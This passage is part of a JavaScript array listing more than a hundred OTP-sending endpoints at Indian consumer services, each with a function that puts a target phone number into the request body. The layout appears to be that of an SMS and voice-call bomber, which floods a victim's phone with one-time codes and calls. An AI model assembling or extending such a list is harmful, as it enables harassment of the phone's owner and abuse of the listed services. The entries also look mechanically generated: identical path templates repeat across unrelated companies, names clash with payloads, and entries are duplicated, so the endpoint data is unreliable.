  { 'name': 'Goibibo SMS', 'url': 'https://goibibo.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Newme Call', 'url': 'https://newme.asia/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Cred SMS', 'url': 'https://cred.club/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Swiggy WhatsApp', 'url': 'https://swiggy.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Paytm SMS', 'url': 'https://paytm.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Instamart SMS', 'url': 'https://instamart.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Zepto WhatsApp', 'url': 'https://zepto.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Uber WhatsApp', 'url': 'https://uber.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Dmart SMS', 'url': 'https://dmart.ready.in/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Amazon WhatsApp', 'url': 'https://amazon.in/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Cred Call', 'url': 'https://cred.club/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Pokerbaazi WhatsApp', 'url': 'https://pokerbaazi.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Gokwik WhatsApp', 'url': 'https://gokwik.co/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Khatabook SMS', 'url': 'https://khatabook.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Instamart Call', 'url': 'https://instamart.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Phonepe WhatsApp', 'url': 'https://phonepe.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Cred WhatsApp', 'url': 'https://cred.club/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Flipkart Call', 'url': 'https://flipkart.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Jupiter WhatsApp', 'url': 'https://jupiter.money/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Tatacapital Call', 'url': 'https://tatacapital.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Uber WhatsApp', 'url': 'https://uber.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Oyorooms Call', 'url': 'https://oyorooms.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Wakefit Call', 'url': 'https://wakefit.co/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Ajio Call', 'url': 'https://ajio.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Olacabs WhatsApp', 'url': 'https://olacabs.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Myntra Call', 'url': 'https://myntra.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Ajio WhatsApp', 'url': 'https://ajio.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Bigbasket SMS', 'url': 'https://bigbasket.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Uber Call', 'url': 'https://uber.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Instamart SMS', 'url': 'https://instamart.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Jupiter SMS', 'url': 'https://jupiter.money/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Tatacapital Call', 'url': 'https://tatacapital.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Cred WhatsApp', 'url': 'https://cred.club/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Pokerbaazi SMS', 'url': 'https://pokerbaazi.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Oyorooms SMS', 'url': 'https://oyorooms.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Olacabs SMS', 'url': 'https://olacabs.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Olacabs Call', 'url': 'https://olacabs.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Dmart Call', 'url': 'https://dmart.ready.in/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Amazon Call', 'url': 'https://amazon.in/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Makemytrip SMS', 'url': 'https://makemytrip.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Khatabook WhatsApp', 'url': 'https://khatabook.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Api-Gateway SMS', 'url': 'https://api-gateway.juno.lenskart.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Newme SMS', 'url': 'https://newme.asia/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Pharmeasy SMS', 'url': 'https://pharmeasy.in/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Phonepe Call', 'url': 'https://phonepe.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Nykaa WhatsApp', 'url': 'https://nykaa.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Swiggy WhatsApp', 'url': 'https://swiggy.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Zepto WhatsApp', 'url': 'https://zepto.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Dmart SMS', 'url': 'https://dmart.ready.in/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Meesho Call', 'url': 'https://meesho.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Shiprocket Call', 'url': 'https://shiprocket.in/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Dmart WhatsApp', 'url': 'https://dmart.ready.in/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Shiprocket Call', 'url': 'https://shiprocket.in/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Zivame SMS', 'url': 'https://zivame.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Ajio Call', 'url': 'https://ajio.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Dmart Call', 'url': 'https://dmart.ready.in/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Newme WhatsApp', 'url': 'https://newme.asia/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Olacabs SMS', 'url': 'https://olacabs.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Gokwik SMS', 'url': 'https://gokwik.co/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Phonepe SMS', 'url': 'https://phonepe.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': '1Mg Call', 'url': 'https://1mg.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Khatabook Call', 'url': 'https://khatabook.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Cred SMS', 'url': 'https://cred.club/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': '1Mg SMS', 'url': 'https://1mg.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Gokwik WhatsApp', 'url': 'https://gokwik.co/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Tatacapital Call', 'url': 'https://tatacapital.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Pokerbaazi SMS', 'url': 'https://pokerbaazi.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Instamart SMS', 'url': 'https://instamart.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Zomato SMS', 'url': 'https://zomato.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Instamart SMS', 'url': 'https://instamart.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Flipkart WhatsApp', 'url': 'https://flipkart.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Uber Call', 'url': 'https://uber.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Goibibo SMS', 'url': 'https://goibibo.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Dmart WhatsApp', 'url': 'https://dmart.ready.in/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Flipkart Call', 'url': 'https://flipkart.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Jupiter Call', 'url': 'https://jupiter.money/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Swiggy Call', 'url': 'https://swiggy.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Phonepe WhatsApp', 'url': 'https://phonepe.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Newme Call', 'url': 'https://newme.asia/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Zivame WhatsApp', 'url': 'https://zivame.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Shiprocket Call', 'url': 'https://shiprocket.in/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Zivame WhatsApp', 'url': 'https://zivame.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Wakefit SMS', 'url': 'https://wakefit.co/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Olacabs SMS', 'url': 'https://olacabs.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Gokwik WhatsApp', 'url': 'https://gokwik.co/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Zomato WhatsApp', 'url': 'https://zomato.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': '1Mg SMS', 'url': 'https://1mg.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Flipkart WhatsApp', 'url': 'https://flipkart.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Makemytrip WhatsApp', 'url': 'https://makemytrip.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Olacabs SMS', 'url': 'https://olacabs.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Swiggy WhatsApp', 'url': 'https://swiggy.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Khatabook SMS', 'url': 'https://khatabook.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Uber SMS', 'url': 'https://uber.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Zepto WhatsApp', 'url': 'https://zepto.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Bigbasket WhatsApp', 'url': 'https://bigbasket.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Blinkit SMS', 'url': 'https://blinkit.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Flipkart SMS', 'url': 'https://flipkart.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Zivame WhatsApp', 'url': 'https://zivame.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Gokwik Call', 'url': 'https://gokwik.co/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Dmart WhatsApp', 'url': 'https://dmart.ready.in/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Flipkart SMS', 'url': 'https://flipkart.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Blinkit Call', 'url': 'https://blinkit.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Meesho SMS', 'url': 'https://meesho.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Rapido WhatsApp', 'url': 'https://rapido.bike/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Flipkart WhatsApp', 'url': 'https://flipkart.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Pharmeasy SMS', 'url': 'https://pharmeasy.in/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Ajio SMS', 'url': 'https://ajio.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Uber SMS', 'url': 'https://uber.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Uber SMS', 'url': 'https://uber.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Wakefit SMS', 'url': 'https://wakefit.co/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Paytm SMS', 'url': 'https://paytm.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Zomato SMS', 'url': 'https://zomato.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Gokwik Call', 'url': 'https://gokwik.co/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Myntra SMS', 'url': 'https://myntra.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Jupiter SMS', 'url': 'https://jupiter.money/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Zepto SMS', 'url': 'https://zepto.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Olacabs SMS', 'url': 'https://olacabs.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Cred WhatsApp', 'url': 'https://cred.club/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Zepto Call', 'url': 'https://zepto.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Instamart WhatsApp', 'url': 'https://instamart.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Bigbasket WhatsApp', 'url': 'https://bigbasket.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Khatabook WhatsApp', 'url': 'https://khatabook.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Pokerbaazi SMS', 'url': 'https://pokerbaazi.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Gokwik WhatsApp', 'url': 'https://gokwik.co/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Dmart SMS', 'url': 'https://dmart.ready.in/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Gokwik WhatsApp', 'url': 'https://gokwik.co/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Uber WhatsApp', 'url': 'https://uber.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Rapido Call', 'url': 'https://rapido.bike/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Flipkart Call', 'url': 'https://flipkart.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Doubtnut WhatsApp', 'url': 'https://doubtnut.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Zomato SMS', 'url': 'https://zomato.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Olacabs SMS', 'url': 'https://olacabs.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Bigbasket WhatsApp', 'url': 'https://bigbasket.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Doubtnut Call', 'url': 'https://doubtnut.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Wakefit Call', 'url': 'https://wakefit.co/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Api-Gateway SMS', 'url': 'https://api-gateway.juno.lenskart.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Newme SMS', 'url': 'https://newme.asia/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Zomato WhatsApp', 'url': 'https://zomato.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Makemytrip WhatsApp', 'url': 'https://makemytrip.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Wakefit WhatsApp', 'url': 'https://wakefit.co/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
